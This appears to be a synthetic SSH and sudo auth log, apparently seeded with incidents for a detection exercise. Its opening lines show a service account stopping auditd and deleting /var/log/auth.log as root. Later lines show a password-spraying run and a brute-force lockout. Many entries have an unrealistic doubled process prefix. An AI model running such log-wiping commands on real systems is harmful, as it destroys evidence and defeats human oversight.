+Oct 20 23:58:00 api-01 sshd[17001]: Accepted publickey for svc_api from 192.0.2.143 port 45110 ssh2: ED25519 SHA256:Vx3nP8qR1sL6mJ0a
+Oct 20 23:58:44 api-01 sudo[17002]: svc_api : TTY=pts/1 ; PWD=/opt/service ; USER=root ; COMMAND=/usr/bin/systemctl stop auditd
+Oct 20 23:59:00 api-01 sudo[17003]: svc_api : TTY=pts/1 ; PWD=/opt/service ; USER=root ; COMMAND=/usr/bin/rm -f /var/log/auth.log
+Oct 21 00:01:23 web-01 polkitd: sshd[14128]: Accepted publickey for ngozi from 172.16.5.12 port 34977 ssh2: ED25519 SHA256:x79P7X9hrajpv1PM
+Oct 21 00:02:21 worker-02 cron: sudo[18373]: deploy : TTY=pts/5 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Oct 21 00:08:44 auth-gw-01 sshd: sudo[2680]: backup : TTY=pts/5 ; PWD=/home/backup ; USER=root ; COMMAND=/usr/bin/ss -tulpn
+Oct 21 00:21:18 web-01 sudo: sshd[24753]: Accepted publickey for sani from 198.51.100.44 port 42606 ssh2: ED25519 SHA256:5PPZvwi4waEY2Vi8
+Oct 21 00:34:30 api-01 sshd: sshd[2314]: Failed password for amara from 192.168.1.31 port 51711 ssh2
+Oct 21 00:35:02 web-01 sshd: sshd[26489]: Accepted publickey for emeka from 198.51.100.23 port 44192 ssh2: ED25519 SHA256:bktacdKRSNuWCcjs
+Oct 21 00:42:25 auth-gw-01 cron: sshd[14442]: Failed password for emeka from 198.51.100.44 port 33808 ssh2
+Oct 21 00:45:22 auth-gw-01 systemd-logind: sshd[2218]: Accepted publickey for tunde from 10.0.2.15 port 34296 ssh2: ED25519 SHA256:tcBMBRplpSA9B90C
+Oct 21 00:47:57 bastion-01 cron: sshd[8736]: Accepted publickey for chioma from 172.16.5.12 port 45165 ssh2: ED25519 SHA256:5CdrGDOvESQ53lMS
+Oct 21 00:47:58 web-01 systemd-logind: systemd-logind[27809]: New session 33 of user ada.
+Oct 21 00:48:41 bastion-01 sudo: sshd[22879]: Invalid user administrator from 198.51.100.44 port 33456
+Oct 21 00:51:47 auth-gw-01 systemd-logind: sshd[3114]: Accepted publickey for admin from 198.51.100.23 port 59179 ssh2: ED25519 SHA256:gT11nqPdD6HqVMtx
+Oct 21 01:01:22 web-01 sshd: sshd[11039]: Accepted publickey for fatima from 172.16.5.12 port 36237 ssh2: ED25519 SHA256:YTnhguXv2LEc0fIF
+Oct 21 01:13:43 worker-02 sudo: systemd-logind[14253]: New session 202 of user ifeoma.
+Oct 21 01:27:05 web-01 sudo: sshd[2737]: Accepted publickey for tunde from 172.16.5.12 port 41676 ssh2: ED25519 SHA256:o13XvrETW1eE5Qb0
+Oct 21 01:28:57 auth-gw-01 polkitd: sshd[9732]: Accepted publickey for kunle from 10.0.4.22 port 54073 ssh2: ED25519 SHA256:lqC5SHu2taE2WyP9
+Oct 21 01:30:03 auth-gw-01 sshd: CRON[25435]: (backup) CMD (/usr/local/bin/rotate-logs)
+Oct 21 01:32:44 web-01 sudo: sshd[12501]: Accepted publickey for ada from 198.51.100.23 port 31634 ssh2: ED25519 SHA256:syiigKCpT8vsKxUW
+Oct 21 01:33:15 db-01 sudo: sshd[15561]: Accepted publickey for ada from 10.0.4.22 port 33487 ssh2: ED25519 SHA256:nyCBzMAHXt4Nq69b
+Oct 21 01:38:12 bastion-01 sshd: CRON[6679]: (root) CMD (/usr/bin/python3 /opt/app/cleanup.py)
+Oct 21 01:40:34 bastion-01 su: sshd[27688]: Accepted publickey for sani from 10.0.8.9 port 45832 ssh2: ED25519 SHA256:oaZimtROgljhKahi
+Oct 21 01:44:26 api-01 polkitd: systemd-logind[24746]: New session 76 of user root.
+Oct 21 01:44:50 web-01 cron: sshd[16001]: Accepted publickey for amara from 192.168.1.24 port 61695 ssh2: ED25519 SHA256:qMp2nlGlNQIdqq63
+Oct 21 01:45:27 web-01 polkitd: sshd[21834]: Accepted publickey for ada from 10.0.8.9 port 33986 ssh2: ED25519 SHA256:Ftz71xmWCe5Ikp0i
+Oct 21 01:45:37 auth-gw-01 polkitd: sshd[12305]: Accepted publickey for backup from 192.168.1.31 port 54543 ssh2: ED25519 SHA256:HuwDgjqwpvfoX2fX
+Oct 21 01:48:56 db-01 sudo: sshd[22840]: Accepted publickey for ngozi from 10.0.8.9 port 32567 ssh2: ED25519 SHA256:7Q6AlhCIDA56oziI
+Oct 21 01:49:01 auth-gw-01 polkitd: sshd[27973]: Failed password for bayo from 198.51.100.44 port 48782 ssh2
+Oct 21 01:54:38 web-01 sshd: sshd[21727]: Invalid user user1 from 192.168.1.24 port 44985
+Oct 21 01:55:26 db-01 sshd: sshd[9597]: Failed password for chioma from 192.168.1.31 port 51572 ssh2
+Oct 21 01:57:02 bastion-01 sudo: sshd[7779]: Accepted publickey for svc_api from 10.0.2.15 port 30286 ssh2: ED25519 SHA256:RmyekFINjUoolVEX
+Oct 21 02:01:34 db-01 sshd: sshd[17537]: Accepted publickey for amara from 172.16.5.12 port 48344 ssh2: ED25519 SHA256:qLttt064eLPy2dlg
+Oct 21 02:04:44 auth-gw-01 sudo: sshd[28629]: Failed password for tunde from 10.0.8.9 port 34860 ssh2
+Oct 21 02:07:25 api-01 cron: systemd-logind[15499]: New session 324 of user svc_api.
+Oct 21 02:12:25 db-01 sshd: sshd[23234]: Failed password for root from 198.51.100.23 port 32473 ssh2
+Oct 21 02:12:31 db-01 cron: systemd-logind[27606]: New session 376 of user deploy.
+Oct 21 02:15:39 auth-gw-01 sshd: sshd[11174]: Accepted publickey for fatima from 203.0.113.17 port 52634 ssh2: ED25519 SHA256:Ff71myTnDWmXzK4M
+Oct 21 02:19:48 db-01 su: sshd[19192]: Failed password for svc_api from 172.16.5.12 port 44596 ssh2
+Oct 21 02:21:26 db-01 systemd-logind: sshd[22228]: Accepted publickey for sani from 192.168.1.24 port 59955 ssh2: ED25519 SHA256:DfQ3DmgixM2MKyDR
+Oct 21 02:22:17 db-01 cron: sudo[21676]: amara : TTY=pts/4 ; PWD=/home/amara ; USER=root ; COMMAND=/usr/bin/journalctl -n 50
+Oct 21 02:33:38 db-01 su: sudo[15853]: ifeoma : TTY=pts/1 ; PWD=/home/ifeoma ; USER=root ; COMMAND=/usr/bin/apt-get update
+Oct 21 02:34:31 db-01 systemd-logind: sshd[14975]: Failed password for svc_api from 192.168.1.31 port 41639 ssh2
+Oct 21 02:42:04 bastion-01 sshd: CRON[21889]: (backup) CMD (/usr/local/bin/rotate-logs)
+Oct 21 02:42:41 api-01 sshd: sudo[28001]: chioma : TTY=pts/0 ; PWD=/home/chioma ; USER=root ; COMMAND=/usr/bin/journalctl -n 50
+Oct 21 02:47:22 bastion-01 su: systemd-logind[11651]: New session 343 of user bayo.
+Oct 21 02:48:09 worker-02 cron: sudo[20744]: ngozi : TTY=pts/4 ; PWD=/home/ngozi ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Oct 21 02:52:20 bastion-01 sshd: sshd[24066]: Accepted publickey for root from 198.51.100.44 port 43282 ssh2: ED25519 SHA256:nWc0l2J5ht5XMVYj
+Oct 21 02:55:36 db-01 sshd: sshd[2299]: Failed password for fatima from 198.51.100.44 port 49210 ssh2
+Oct 21 02:56:41 api-01 cron: systemd-logind[26176]: New session 276 of user deploy.
+Oct 21 02:57:32 bastion-01 polkitd: sshd[17384]: Accepted publickey for backup from 10.0.2.15 port 33287 ssh2: ED25519 SHA256:rGH294zU2uOKooKG
+Oct 21 02:58:55 bastion-01 systemd-logind: sshd[13926]: Accepted publickey for chioma from 10.0.4.22 port 41197 ssh2: ED25519 SHA256:RrXAgDmEEyHoeFFL
+Oct 21 03:01:47 api-01 sshd: sshd[15790]: Failed password for chioma from 10.0.8.9 port 39371 ssh2
+Oct 21 03:03:48 web-01 cron: sshd[6123]: Failed password for ifeoma from 192.168.1.24 port 47949 ssh2
+Oct 21 03:12:00 api-01 systemd-logind: sshd[25620]: Accepted publickey for emeka from 10.0.4.22 port 50468 ssh2: ED25519 SHA256:rQIxPfg9GqCuRBXK
+Oct 21 03:13:34 bastion-01 sshd: CRON[20538]: (backup) CMD (/usr/bin/python3 /opt/app/cleanup.py)
+Oct 21 03:14:55 auth-gw-01 cron: sshd[4168]: Accepted publickey for tunde from 192.168.1.24 port 36304 ssh2: ED25519 SHA256:YMQsNXaKwJtodlVe
+Oct 21 03:19:19 worker-02 cron: sshd[2271]: Accepted publickey for fatima from 192.168.1.24 port 53218 ssh2: ED25519 SHA256:YZQ4nqiK5DRihkce
+Oct 21 03:21:59 bastion-01 su: systemd-logind[8484]: New session 326 of user admin.
+Oct 21 03:23:03 worker-02 systemd-logind: sshd[14637]: Accepted publickey for kunle from 192.168.1.31 port 55197 ssh2: ED25519 SHA256:VwenBnA2pA1sXJG7
+Oct 21 03:23:37 bastion-01 systemd-logind: sshd[1316]: Accepted publickey for kunle from 198.51.100.23 port 44100 ssh2: ED25519 SHA256:qftNEMxIpn4ZkFSj
+Oct 21 03:24:27 db-01 sshd: CRON[1604]: (backup) CMD (/usr/bin/find /var/log -type f -mtime +14 -delete)
+Oct 21 03:27:07 api-01 polkitd: sshd[27261]: Accepted publickey for sani from 10.0.2.15 port 57026 ssh2: ED25519 SHA256:QJ98ZF4LnCz5yOw3
+Oct 21 03:29:24 api-01 cron: sshd[7964]: Accepted publickey for deploy from 192.168.1.24 port 38516 ssh2: ED25519 SHA256:91pAitEfgxQPcQcZ
+Oct 21 03:31:02 api-01 sudo: sudo[4959]: svc_api : TTY=pts/2 ; PWD=/home/svc_api ; USER=root ; COMMAND=/usr/bin/ss -tulpn
+Oct 21 03:32:19 bastion-01 su: sshd[5053]: Accepted publickey for emeka from 198.51.100.44 port 63251 ssh2: ED25519 SHA256:TXKp9HyLD6dWX43m
+Oct 21 03:40:33 web-01 su: sshd[8063]: Accepted publickey for emeka from 10.0.4.22 port 46153 ssh2: ED25519 SHA256:2Rf0UJETK6MIelfN
+Oct 21 03:43:08 api-01 su: sshd[16766]: Accepted publickey for ifeoma from 192.168.1.24 port 56565 ssh2: ED25519 SHA256:unbCGrMVxHZ7Ps47
+Oct 21 03:47:25 bastion-01 sshd: CRON[27249]: (backup) CMD (/usr/local/bin/rotate-logs)
+Oct 21 03:55:48 web-01 sudo: systemd-logind[3850]: New session 266 of user ifeoma.
+Oct 21 03:56:33 api-01 sshd: sudo[26060]: backup : TTY=pts/0 ; PWD=/home/backup ; USER=root ; COMMAND=/usr/bin/ss -tulpn
+Oct 21 04:01:21 auth-gw-01 sudo: sshd[13419]: Failed password for ifeoma from 192.168.1.24 port 50970 ssh2
+Oct 21 04:03:29 api-01 systemd-logind: systemd-logind[14935]: New session 3 of user tunde.
+Oct 21 04:03:43 bastion-01 cron: sshd[5639]: Failed password for kunle from 10.0.2.15 port 36287 ssh2
+Oct 21 04:04:43 bastion-01 cron: sudo[1020]: ifeoma : TTY=pts/5 ; PWD=/home/ifeoma ; USER=root ; COMMAND=/usr/bin/apt-get update
+Oct 21 04:08:19 db-01 sshd: sshd[11419]: Accepted publickey for chioma from 192.168.1.31 port 46884 ssh2: ED25519 SHA256:klnTrYmpsOK7bec6
+Oct 21 04:08:19 web-01 systemd-logind: sshd[24433]: Failed password for admin from 10.0.8.9 port 61322 ssh2
+Oct 21 04:21:41 worker-02 sshd: systemd-logind[3613]: New session 20 of user backup.
+Oct 21 04:22:00 bastion-01 sshd[18000]: Failed password for emeka from 203.0.113.149 port 46000 ssh2
+Oct 21 04:22:23 bastion-01 sshd[18001]: Failed password for ada from 203.0.113.149 port 46001 ssh2
+Oct 21 04:22:46 bastion-01 sshd[18002]: Failed password for chioma from 203.0.113.149 port 46002 ssh2
+Oct 21 04:23:09 bastion-01 sshd[18003]: Failed password for tunde from 203.0.113.149 port 46003 ssh2
+Oct 21 04:23:32 bastion-01 sshd[18004]: Failed password for fatima from 203.0.113.149 port 46004 ssh2
+Oct 21 04:23:55 bastion-01 sshd[18005]: Failed password for kunle from 203.0.113.149 port 46005 ssh2
+Oct 21 04:24:18 bastion-01 sshd[18006]: Failed password for ngozi from 203.0.113.149 port 46006 ssh2
+Oct 21 04:24:41 bastion-01 sshd[18007]: Failed password for bayo from 203.0.113.149 port 46007 ssh2
+Oct 21 04:25:04 bastion-01 sshd[18008]: Failed password for admin from 203.0.113.149 port 46008 ssh2
+Oct 21 04:25:27 bastion-01 sshd[18009]: Failed password for deploy from 203.0.113.149 port 46009 ssh2
+Oct 21 04:25:34 worker-02 polkitd: sshd[23934]: Accepted publickey for tunde from 172.16.5.12 port 53578 ssh2: ED25519 SHA256:CtEv2a4cfLBpOcar
+Oct 21 04:26:47 db-01 su: sshd[9123]: Failed password for ifeoma from 10.0.2.15 port 53981 ssh2
+Oct 21 04:28:42 api-01 cron: systemd-logind[12727]: New session 151 of user bayo.
+Oct 21 04:32:39 web-01 sshd: sshd[13713]: Accepted publickey for tunde from 203.0.113.17 port 60275 ssh2: ED25519 SHA256:jqTmoj3128pn1Ab6
+Oct 21 04:41:58 api-01 polkitd: sshd[18010]: Accepted publickey for svc_api from 198.51.100.44 port 35377 ssh2: ED25519 SHA256:c3E8QsSMbuYailtn
+Oct 21 04:43:20 bastion-01 systemd-logind: systemd-logind[18404]: New session 14 of user chioma.
+Oct 21 04:46:49 auth-gw-01 sshd: systemd-logind[23881]: New session 59 of user bayo.
+Oct 21 04:55:48 db-01 polkitd: sshd[23418]: Accepted publickey for deploy from 10.0.2.15 port 49136 ssh2: ED25519 SHA256:GOsbT1NuZvwf364m
+Oct 21 04:57:27 auth-gw-01 sshd: sshd[25513]: Accepted publickey for root from 192.168.1.31 port 36415 ssh2: ED25519 SHA256:lqDsBsH88B1ZcKtT
+Oct 21 04:58:18 web-01 sshd: sshd[4068]: Failed password for root from 192.168.1.31 port 52040 ssh2
+Oct 21 04:58:52 worker-02 polkitd: sshd[10834]: Invalid user oracle from 198.51.100.44 port 39553
+Oct 21 04:59:50 auth-gw-01 sudo: sshd[3065]: Accepted publickey for deploy from 10.0.8.9 port 35612 ssh2: ED25519 SHA256:jGNrV6D4tuNDkp37
+Oct 21 04:59:57 bastion-01 sudo: CRON[4619]: (svc_api) CMD (/usr/bin/find /var/log -type f -mtime +14 -delete)
+Oct 21 05:04:06 worker-02 polkitd: sshd[24199]: Invalid user oracle from 198.51.100.44 port 31385
+Oct 21 05:15:40 bastion-01 sshd: systemd-logind[26082]: New session 325 of user ada.
+Oct 21 05:19:33 worker-02 su: sshd[2526]: Accepted publickey for ngozi from 10.0.4.22 port 31153 ssh2: ED25519 SHA256:StVO0pL6oXjcPsDW
+Oct 21 05:21:37 api-01 cron: sshd[5940]: Invalid user oracle1 from 203.0.113.17 port 31415
+Oct 21 05:22:02 db-01 polkitd: sshd[2048]: Failed password for bayo from 198.51.100.23 port 55115 ssh2
+Oct 21 05:25:00 db-01 sudo: sudo[20343]: chioma : TTY=pts/4 ; PWD=/home/chioma ; USER=root ; COMMAND=/usr/bin/apt-get update
+Oct 21 05:25:09 db-01 systemd-logind: CRON[4884]: (svc_api) CMD (/usr/bin/python3 /opt/app/cleanup.py)
+Oct 21 05:27:29 web-01 su: sshd[19125]: Failed password for chioma from 10.0.2.15 port 63226 ssh2
+Oct 21 05:39:26 web-01 sshd: systemd-logind[777]: New session 17 of user ngozi.
+Oct 21 05:39:30 api-01 polkitd: systemd-logind[3641]: New session 114 of user admin.
+Oct 21 05:40:47 api-01 cron: sshd[11042]: Accepted publickey for fatima from 172.16.5.12 port 52801 ssh2: ED25519 SHA256:ODuURWcQZu2ALsCR
+Oct 21 05:47:11 db-01 sshd: sshd[13507]: Accepted publickey for bayo from 172.16.5.12 port 30296 ssh2: ED25519 SHA256:pPSMZWo16JJseoN4
+Oct 21 05:48:02 db-01 su: sshd[18440]: Invalid user user1 from 203.0.113.17 port 58124
+Oct 21 05:50:19 worker-02 sshd: sudo[12334]: kunle : TTY=pts/2 ; PWD=/home/kunle ; USER=root ; COMMAND=/usr/bin/journalctl -n 50
+Oct 21 05:54:17 web-01 sudo: sshd[10978]: Accepted publickey for backup from 192.168.1.31 port 41347 ssh2: ED25519 SHA256:jKRCktiZkm1T9gdi
+Oct 21 05:54:41 bastion-01 polkitd: sshd[23688]: Accepted publickey for sani from 10.0.8.9 port 34775 ssh2: ED25519 SHA256:7qCyJnTopLbh5Mdf
+Oct 21 05:58:29 worker-02 sshd: sshd[14990]: Accepted publickey for amara from 198.51.100.23 port 30718 ssh2: ED25519 SHA256:FXAafYbGOv8PoPDz
+Oct 21 06:02:07 worker-02 su: sshd[10727]: Accepted publickey for chioma from 172.16.5.12 port 56167 ssh2: ED25519 SHA256:1ujrPOsei6WQFIJt
+Oct 21 06:03:44 auth-gw-01 cron: systemd-logind[14720]: New session 177 of user tunde.
+Oct 21 06:04:01 bastion-01 systemd-logind: CRON[1592]: (svc_api) CMD (/usr/local/bin/health-check)
+Oct 21 06:05:43 web-01 su: sshd[24634]: Accepted publickey for ifeoma from 172.16.5.12 port 47944 ssh2: ED25519 SHA256:mlUm8tSmD3H4xAuj
+Oct 21 06:12:26 api-01 sshd: sshd[9217]: Accepted publickey for fatima from 203.0.113.17 port 64178 ssh2: ED25519 SHA256:7ZOco4hctPr5GfY7
+Oct 21 06:14:59 auth-gw-01 sshd: systemd-logind[14693]: New session 281 of user emeka.
+Oct 21 06:34:02 api-01 sudo: sshd[24973]: Accepted publickey for sani from 198.51.100.23 port 53433 ssh2: ED25519 SHA256:wQm7ugiQ8d4rghTJ
+Oct 21 06:35:39 bastion-01 sshd: sshd[22688]: Accepted publickey for admin from 10.0.2.15 port 56217 ssh2: ED25519 SHA256:kETlPFnEDSN8kqDF
+Oct 21 06:36:25 web-01 sshd: systemd-logind[8569]: New session 487 of user bayo.
+Oct 21 06:39:16 db-01 sudo: sshd[19048]: Accepted publickey for svc_api from 10.0.2.15 port 64843 ssh2: ED25519 SHA256:KGjCgFRbcPOdi3Qo
+Oct 21 06:39:46 worker-02 cron: CRON[19482]: (svc_api) CMD (/usr/local/bin/rotate-logs)
+Oct 21 06:40:23 auth-gw-01 cron: systemd-logind[1703]: New session 209 of user backup.
+Oct 21 06:42:07 bastion-01 sudo: sshd[18789]: Invalid user oracle1 from 198.51.100.44 port 47940
+Oct 21 06:44:46 bastion-01 systemd-logind: sudo[3050]: ngozi : TTY=pts/2 ; PWD=/home/ngozi ; USER=root ; COMMAND=/usr/bin/journalctl -n 50
+Oct 21 06:46:53 bastion-01 sshd: sshd[21601]: Accepted publickey for amara from 198.51.100.23 port 64649 ssh2: ED25519 SHA256:gEtqxoYNM3gDnlNj
+Oct 21 06:51:13 auth-gw-01 polkitd: sshd[20026]: Failed password for fatima from 192.168.1.31 port 58898 ssh2
+Oct 21 06:52:09 bastion-01 sshd: sshd[24835]: Failed password for emeka from 10.0.4.22 port 31422 ssh2
+Oct 21 06:53:48 api-01 sudo: sshd[1372]: Failed password for tunde from 172.16.5.12 port 50616 ssh2
+Oct 21 06:54:15 web-01 cron: sshd[19887]: Failed password for root from 192.168.1.24 port 56048 ssh2
+Oct 21 06:56:22 web-01 systemd-logind: sudo[1510]: fatima : TTY=pts/4 ; PWD=/home/fatima ; USER=root ; COMMAND=/usr/bin/journalctl -n 50
+Oct 21 07:00:40 worker-02 cron: sshd[9522]: Invalid user oracle1 from 10.0.8.9 port 54832
+Oct 21 07:02:24 api-01 sshd: sshd[28539]: Accepted publickey for kunle from 10.0.4.22 port 50651 ssh2: ED25519 SHA256:EPqPyXuAhi95Z5Ch
+Oct 21 07:04:34 worker-02 systemd-logind: sshd[2994]: Accepted publickey for bayo from 198.51.100.23 port 47196 ssh2: ED25519 SHA256:i9XAlPXR82eQZ2Si
+Oct 21 07:06:35 bastion-01 sshd: sshd[15870]: Accepted publickey for tunde from 10.0.8.9 port 43048 ssh2: ED25519 SHA256:vE0Di4d0tnMsFk9l
+Oct 21 07:08:25 db-01 cron: sshd[3525]: Accepted publickey for tunde from 192.168.1.24 port 64831 ssh2: ED25519 SHA256:uZSh2B3f3DLrKvwg
+Oct 21 07:10:18 auth-gw-01 cron: sshd[20304]: Accepted publickey for backup from 198.51.100.44 port 33198 ssh2: ED25519 SHA256:Z52jR6GtPK2buUvd
+Oct 21 07:12:54 api-01 systemd-logind: systemd-logind[14621]: New session 200 of user kunle.
+Oct 21 07:13:34 auth-gw-01 sshd: sshd[23815]: Accepted publickey for svc_api from 10.0.2.15 port 64419 ssh2: ED25519 SHA256:3TXHeXttuW6yU89x
+Oct 21 07:13:56 auth-gw-01 polkitd: sshd[23945]: Accepted publickey for emeka from 10.0.8.9 port 35952 ssh2: ED25519 SHA256:ws14isXXT7jJR2SA
+Oct 21 07:16:39 db-01 sshd: sshd[7764]: Accepted publickey for amara from 10.0.8.9 port 33689 ssh2: ED25519 SHA256:McWsPsTQpK9ZvVcZ
+Oct 21 07:20:00 api-01 sshd: sshd[24849]: Accepted publickey for svc_api from 192.168.1.31 port 51012 ssh2: ED25519 SHA256:vyCQY4jeIVEnapmS
+Oct 21 07:20:16 bastion-01 cron: sshd[5606]: Accepted publickey for admin from 198.51.100.44 port 56403 ssh2: ED25519 SHA256:W3kCMMtA9BNtiiY2
+Oct 21 07:21:13 api-01 sshd: sshd[22754]: Accepted publickey for amara from 198.51.100.44 port 38982 ssh2: ED25519 SHA256:3bOxV8PxE0dw05GY
+Oct 21 07:24:47 db-01 systemd-logind: sshd[26037]: Accepted publickey for amara from 198.51.100.23 port 55094 ssh2: ED25519 SHA256:E2n6iA3IyXIIEuBN
+Oct 21 07:25:47 bastion-01 systemd-logind: sshd[11736]: Accepted publickey for admin from 10.0.4.22 port 33697 ssh2: ED25519 SHA256:t2LmTSxGdLjEmzd7
+Oct 21 07:26:56 worker-02 polkitd: sshd[19269]: Failed password for fatima from 10.0.8.9 port 31165 ssh2
+Oct 21 07:28:30 worker-02 polkitd: sshd[12994]: Accepted publickey for bayo from 172.16.5.12 port 35957 ssh2: ED25519 SHA256:LucAdPlyAxkGdtTV
+Oct 21 07:29:34 db-01 polkitd: sshd[22453]: Accepted publickey for ngozi from 10.0.4.22 port 57918 ssh2: ED25519 SHA256:s7nQBiT8sPduFyC4
+Oct 21 07:31:50 auth-gw-01 systemd-logind: sshd[22770]: Failed password for tunde from 198.51.100.23 port 55854 ssh2
+Oct 21 07:32:05 web-01 systemd-logind: sudo[14043]: root : TTY=pts/0 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/apt-get update
+Oct 21 07:47:40 worker-02 systemd-logind: sudo[16565]: svc_api : TTY=pts/5 ; PWD=/home/svc_api ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Oct 21 07:51:08 web-01 systemd-logind: sshd[6807]: Accepted publickey for backup from 10.0.8.9 port 36938 ssh2: ED25519 SHA256:CmwQUOeDvIfiFgRC
+Oct 21 07:54:25 worker-02 polkitd: systemd-logind[9218]: New session 453 of user fatima.
+Oct 21 08:02:36 web-01 sshd: systemd-logind[14654]: New session 207 of user ngozi.
+Oct 21 08:03:14 auth-gw-01 polkitd: sshd[10351]: Accepted publickey for svc_api from 10.0.4.22 port 56785 ssh2: ED25519 SHA256:vGuehxSupQ4G4Dpb
+Oct 21 08:05:27 db-01 cron: sudo[20051]: emeka : TTY=pts/0 ; PWD=/home/emeka ; USER=root ; COMMAND=/usr/bin/journalctl -n 50
+Oct 21 08:11:11 auth-gw-01 su: sshd[22027]: Failed password for ada from 10.0.8.9 port 56148 ssh2
+Oct 21 08:13:47 worker-02 sshd: sshd[21652]: Accepted publickey for amara from 198.51.100.23 port 39859 ssh2: ED25519 SHA256:64nBzjDaIlbBpt35
+Oct 21 08:16:56 auth-gw-01 sshd: systemd-logind[27508]: New session 226 of user emeka.
+Oct 21 08:23:54 bastion-01 cron: sshd[11491]: Accepted publickey for fatima from 192.168.1.24 port 45497 ssh2: ED25519 SHA256:aokN8YuHiSEid0hp
+Oct 21 08:35:37 db-01 systemd-logind: systemd-logind[8697]: New session 278 of user emeka.
+Oct 21 08:38:49 worker-02 su: sshd[15931]: Accepted publickey for backup from 203.0.113.17 port 33045 ssh2: ED25519 SHA256:HGUbYYC5jzbt0kbX
+Oct 21 08:47:53 web-01 polkitd: systemd-logind[2725]: New session 106 of user ngozi.
+Oct 21 08:48:34 web-01 sshd: sudo[8700]: ngozi : TTY=pts/2 ; PWD=/home/ngozi ; USER=root ; COMMAND=/usr/bin/journalctl -n 50
+Oct 21 08:50:00 web-01 sshd: sshd[24205]: Failed password for amara from 10.0.2.15 port 40823 ssh2
+Oct 21 08:54:19 api-01 sudo: sshd[2854]: Failed password for ngozi from 198.51.100.23 port 62636 ssh2
+Oct 21 08:57:50 auth-gw-01 systemd-logind: sshd[14953]: Accepted publickey for ngozi from 198.51.100.44 port 59026 ssh2: ED25519 SHA256:KH3Bul2Odl9n5Zxq
+Oct 21 08:59:23 web-01 sudo: sudo[24880]: root : TTY=pts/1 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Oct 21 09:03:12 bastion-01 polkitd: sshd[24955]: Failed password for backup from 10.0.2.15 port 63016 ssh2
+Oct 21 09:04:14 bastion-01 sshd: sshd[26322]: Failed password for admin from 192.168.1.31 port 64561 ssh2
+Oct 21 09:05:00 auth-gw-01 pam_unix(sshd:auth)[19000]: authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=198.51.100.91 user=backup
+Oct 21 09:05:02 api-01 sshd: sshd[8860]: Accepted publickey for chioma from 192.168.1.24 port 41554 ssh2: ED25519 SHA256:fJ1v8ZZRXIb5EDoK
+Oct 21 09:05:12 auth-gw-01 pam_unix(sshd:auth)[19001]: authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=198.51.100.91 user=backup
+Oct 21 09:05:24 auth-gw-01 pam_unix(sshd:auth)[19002]: authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=198.51.100.91 user=backup
+Oct 21 09:05:36 auth-gw-01 pam_unix(sshd:auth)[19003]: authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=198.51.100.91 user=backup
+Oct 21 09:05:48 auth-gw-01 pam_unix(sshd:auth)[19004]: authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=198.51.100.91 user=backup
+Oct 21 09:06:00 auth-gw-01 pam_unix(sshd:auth)[19005]: authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=198.51.100.91 user=backup
+Oct 21 09:07:00 auth-gw-01 pam_faillock(sshd:auth)[19010]: account backup temporarily locked due to 6 failed logins
+Oct 21 09:09:13 api-01 sudo: systemd-logind[25800]: New session 204 of user admin.
+Oct 21 09:11:34 bastion-01 sudo: systemd-logind[12890]: New session 306 of user bayo.
+Oct 21 09:12:00 web-01 sshd: systemd-logind[10920]: New session 211 of user sani.
+Oct 21 09:13:43 api-01 sshd: sshd[27208]: Accepted publickey for tunde from 198.51.100.23 port 62054 ssh2: ED25519 SHA256:R24fsmUHeFOJ7zfG
+Oct 21 09:23:48 api-01 cron: sshd[13996]: Accepted publickey for ngozi from 192.168.1.31 port 30721 ssh2: ED25519 SHA256:DCi0mLLIBSN8Ufm7
+Oct 21 09:26:11 web-01 polkitd: sshd[7203]: Accepted publickey for root from 198.51.100.23 port 32144 ssh2: ED25519 SHA256:Q38sYhuIDQd59G1L
+Oct 21 09:28:07 api-01 cron: sshd[6787]: Failed password for sani from 192.168.1.24 port 43116 ssh2
+Oct 21 09:30:03 worker-02 sshd: sshd[15343]: Failed password for amara from 198.51.100.44 port 57819 ssh2
+Oct 21 09:30:26 worker-02 sudo: sudo[10508]: tunde : TTY=pts/4 ; PWD=/home/tunde ; USER=root ; COMMAND=/usr/bin/ss -tulpn
+Oct 21 09:31:49 web-01 systemd-logind: sshd[8151]: Failed password for ngozi from 10.0.2.15 port 32916 ssh2
+Oct 21 09:37:44 auth-gw-01 sudo: CRON[6957]: (svc_api) CMD (/usr/bin/find /var/log -type f -mtime +14 -delete)
+Oct 21 09:38:54 worker-02 sshd: sshd[10471]: Invalid user git from 10.0.2.15 port 41039
+Oct 21 09:47:00 auth-gw-01 su: systemd-logind[6667]: New session 64 of user ada.
+Oct 21 09:50:53 api-01 sudo: sshd[26274]: Failed password for emeka from 10.0.8.9 port 54517 ssh2
+Oct 21 10:12:28 worker-02 sshd: sudo[22967]: ada : TTY=pts/1 ; PWD=/home/ada ; USER=root ; COMMAND=/usr/bin/apt-get update
+Oct 21 10:14:33 api-01 systemd-logind: sshd[6910]: Failed password for ifeoma from 192.168.1.31 port 33826 ssh2
+Oct 21 10:21:01 api-01 sshd: sshd[19308]: Invalid user git from 192.168.1.24 port 53521
+Oct 21 10:22:20 api-01 systemd-logind: sshd[19565]: Failed password for ifeoma from 172.16.5.12 port 63254 ssh2
+Oct 21 10:30:00 worker-02 sshd[20001]: Accepted publickey for deploy from 10.0.2.15 port 47001 ssh2: ED25519 SHA256:deployKeyExample01
+Oct 21 10:30:20 worker-02 sudo[20002]: deploy : TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app.service
+Oct 21 10:30:55 worker-02 sudo[20003]: deploy : TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/journalctl -u app.service -n 80
+Oct 21 10:35:11 auth-gw-01 sshd: sshd[2838]: Accepted publickey for ada from 10.0.8.9 port 37093 ssh2: ED25519 SHA256:IFFflMzfCVc05mde
+Oct 21 10:36:10 db-01 sshd: sshd[6375]: Accepted publickey for bayo from 172.16.5.12 port 60271 ssh2: ED25519 SHA256:81XbuJHf2fDhNNA9
+Oct 21 10:37:58 db-01 sshd: sshd[1896]: Invalid user test from 192.168.1.24 port 51347
